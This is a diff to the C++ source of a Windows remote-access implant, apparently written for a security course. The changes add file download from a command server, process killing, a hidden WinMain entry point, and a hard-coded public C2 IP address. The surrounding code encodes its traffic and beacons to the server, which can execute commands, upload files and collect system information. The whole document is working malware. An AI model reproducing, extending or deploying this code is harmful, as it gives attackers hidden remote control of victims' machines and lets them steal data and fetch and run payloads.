@@ -5,15 +5,18 @@
 #include <tchar.h>
 #include <iphlpapi.h>
 #include <tlhelp32.h>
+#include <urlmon.h>
 using namespace std;
 
 #pragma comment(lib,"Wininet.lib")
 #pragma comment(lib, "IPHLPAPI.lib")
+#pragma comment(lib, "urlmon.lib")
 
 #define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
 #define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
 
 
+//Encodes string using key
 std::string encode(std::string key, std::string clear) {
 	string enc = "";
 	char key_c;
@@ -30,6 +33,7 @@ std::string encode(std::string key, std::string clear) {
 }
 
 
+//Decodes string using key
 std::string decode(std::string key, std::string enc) {
 	string dec = "";
 	char key_c;
@@ -46,8 +50,9 @@ std::string decode(std::string key, std::string enc) {
 }
 
 
+//Encodes and sends data in one easy function
+//Returns string output
 std::string send_enc(std::string key, std::string data, std::string endpoint, HANDLE hConnect) {
-	//string clear = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[{()}]+=/\\?., ;:!@#$%^&*_-";
 	std::string result = encode(key, data);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	BOOL reqSuccess =  HttpSendRequestA(hRequest, NULL, NULL, (LPVOID)result.c_str(), result.length());
@@ -106,6 +111,14 @@ BOOL doFileUpload(HANDLE hConnect, char* filepath) {
 	return TRUE;
 }
 
+
+//Downloads file to path
+BOOL doFileDownload(std::string url, std::string filepath) {
+	cout << url << " " << filepath << "\n";
+	if (S_OK == URLDownloadToFileA(NULL, url.c_str(), filepath.c_str(), 0, NULL))
+		return TRUE;
+	return FALSE;
+}
 
 //Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
 //Returns string buffer containing command output 
@@ -249,6 +262,25 @@ std::string getProcToStr() {
 }
 
 
+//Kills process PID
+BOOLEAN killProcess(DWORD pid) {
+	std::string proclst;
+	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 procEntry;
+	procEntry.dwSize = sizeof(PROCESSENTRY32);
+
+	Process32First(hTH32, &procEntry);
+	do
+	{
+		if (procEntry.th32ProcessID == pid) {
+			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, NULL, procEntry.th32ProcessID);
+			return TerminateProcess(hProcess, 0);
+		}
+	} while (Process32Next(hTH32, &procEntry));
+	return FALSE;
+}
+
+
 //Gets list of network interfaces and converts MAC/IP addresses to comma-separated string
 std::string getNetworkInfo() {
 	UINT i;
@@ -364,11 +396,12 @@ std::string gatherInfo(HANDLE hInternet) {
 	return allInfo;
 }
 
-
-int main() {
-	const char* IP = "127.0.0.1";
+//int main(){
+int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+	//const char* IP = "127.0.0.1";
+	const char* IP = "54.158.180.71";
 	const int PORT = 5000;
-	const int SLEEPTIME = 1999;
+	const int SLEEPTIME = 4000;
 	DWORD MAX_CMD_TIME = 5 * (10000000);
 	const std::string key = "CSEC476";
 
@@ -378,19 +411,6 @@ int main() {
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	HttpEndRequestA(hRequest, NULL, NULL, NULL);
 
-	/*
-	//Sends Process List to Server
-	std::string procInfo = getProcToStr();
-	HANDLE hRequestPS = HttpOpenRequestA(hConnect, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	HttpSendRequestA(hRequestPS, NULL, NULL, (LPVOID)procInfo.c_str(), procInfo.size());
-	HttpEndRequestA(hRequestPS, NULL, NULL, NULL);
-
-	//Sends all other info to server
-	std::string allInfo = gatherInfo(hInternet);
-	HANDLE hRequestInfo = HttpOpenRequestA(hConnect, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	HttpSendRequestA(hRequestInfo, NULL, NULL, (LPVOID)allInfo.c_str(), allInfo.size());
-	HttpEndRequestA(hRequestInfo, NULL, NULL, NULL);
-	*/
 	
 	while (true) {
 		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
@@ -399,6 +419,8 @@ int main() {
 		cout << "Response " << response << "\n";
 		//Process request here. If first part of string is a 1, do this... 2 do this... etc.
 		std::string code = response.substr(0, response.find(" "));
+		int first;
+		int second;
 		switch (atoi(code.c_str())){
 		case 1:
 			//OK
@@ -427,10 +449,15 @@ int main() {
 		case 6:
 			//DOWNLOAD
 			cout << "Got 6" << "\n";
+			first = response.find(" ");
+			second = response.find(" ", first+1);
+			doFileDownload(response.substr(first+1, second-2), response.substr(second+1));
 			break;
 		case 7:
 			//KILL
 			cout << "Got 7" << "\n";
+			cout << atoi(response.substr(response.find(" ") + 1).c_str()) << "\n";
+			killProcess(atoi(response.substr(response.find(" ") + 1).c_str()));
 			break;
 		default:
 			cout << "Got unknown value" << "\n";
